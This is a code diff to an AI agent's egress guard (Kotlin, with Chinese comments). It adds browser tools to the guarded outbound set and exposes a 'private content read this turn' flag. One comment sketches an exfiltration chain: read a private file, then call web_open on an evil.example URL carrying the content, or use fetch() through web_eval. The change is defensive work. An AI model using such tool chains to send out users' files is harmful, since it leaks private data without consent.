@@ -64,6 +64,16 @@ class EgressGuard(
         tainted.set(false)
     }
 
+    /**
+     * 本回合是否已经读过私有内容。
+     *
+     * 给审批层用的：`http_request` 走的是另一条路（[ApprovalScope] 按域名记忆），
+     * 用户上周允许过 `example.com` 之后，同域 POST 就不再问了。那种记忆在本回合
+     * 「刚读过工作区文件」的语境下是失效的——审批层拿不到「读过」这个事实，只能问这里。
+     */
+    val taintedNow: Boolean get() = tainted.get()
+
+
     override suspend fun check(ctx: GuardContext): GuardDecision {
         val name = ctx.call.name
         if (name in sensitiveTools) {
@@ -126,17 +136,41 @@ class EgressGuard(
         /**
          * 出站通道。
          *
-         * **只收「免审批」的那几个**。这不是漏了，是刻意：
-         *  - `http_request` 本身 `needsApproval = true`，且 [ApprovalScope] 按**域名**记忆
-         *    ——用户上次允许过 `example.com`，这次同域的 POST 就不再问。它确实有盲区，
-         *    但如果这里再拦一次，同一个动作会连着弹两个一模一样的「网络请求（host）」，
-         *    用户只会学会无脑点「允许」——重复确认比不确认更危险。要补这个盲区，
-         *    正确做法是让审批弹窗带上「本回合读过私有内容」的上下文（P1 的 Consent 契约），
-         *    而不是在守卫链里加第二道同样的门。
-         *  - `github_commit` 同理：逐次确认、不可记忆，不需要第二道门。
+         * ## 为什么是这五个，而不是「所有能联网的工具」
+         *
+         * 只收**免审批**（或审批粒度管不着「内容出站」）的那些。`http_request` 不在此列：
+         * 它本身 `needsApproval = true`，且 [ApprovalScope] 按**域名**记忆——用户上次
+         * 允许过 `example.com`，这次同域的 POST 就不再问。那种记忆就是盲区，但它由
+         * 审批层补（`ChatViewModel` 在「本回合读过私有内容」时把外发审批降级为
+         * 一次性、不可记忆），不是在守卫链里加第二道一模一样的门：同一个动作弹两次
+         * 「网络请求」，用户只会学会无脑点允许——重复确认比不确认更危险。
+         *
+         * ## 补上的四个 `web_*`（2026-11-17）
+         *
+         * 这一版之前这里只有 `web_search`，而 `web_open` / `web_eval` / `web_click` /
+         * `web_type` 在 `ToolCatalog` 里**都是免审批**（`Capability.PRIVILEGED` /
+         * `DANGEROUS`，没有 `Approval` 归组）。也就是说：
+         *
+         * ```
+         * read_file(工作区里的私密文件) → web_open("https://evil.example/?d=" + 内容)
+         * ```
+         *
+         * 全程零弹窗——比 `web_search` 那条更静默，因为连搜索词都不会出现在用户眼前。
+         * `web_eval` 更直接：一行 `fetch()` 就能把内容发走。
+         *
+         * 它们**不**进审批归组是有道理的（浏览网页是高频正常操作，每次都问会把
+         * 浏览器工具废掉）；但「读完私有内容之后再用浏览器」完全是另一件事，
+         * 那正是本守卫的判据，两件事不冲突。
+         *
+         * `web_snapshot` 不加：它只读当前页，不把新内容送出（页面发什么请求由
+         * 打开时的 URL 决定，那一刻已经问过了）。
          */
         val DEFAULT_EGRESS_TOOLS: Set<String> = setOf(
             "web_search",
+            "web_open",
+            "web_eval",
+            "web_click",
+            "web_type",
         )
     }
 }
